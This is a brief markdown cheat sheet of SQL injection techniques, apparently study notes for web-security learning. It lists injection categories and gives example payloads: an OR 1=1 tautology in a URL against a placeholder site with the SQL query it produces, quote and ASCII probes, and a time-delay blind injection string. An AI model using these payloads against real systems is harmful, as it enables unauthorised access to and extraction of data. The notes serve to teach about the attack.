# Examples of SQL Injection

* Retrieving hidden data
* Subverting application logic
* UNION attacks
* Examining the database
* Blind SQL injection

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
This results in the SQL query:
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`


`'
`ASCII(97)
``' OR 1=1--
`'; waitfor delay ('0:0:20')--

In **WHERE**, **UPDATE**, **INSERT**, **SELECT** and in **ORDER BY**

# Second order SQL Injection
Store input in database, this stored data is trusted at process time.


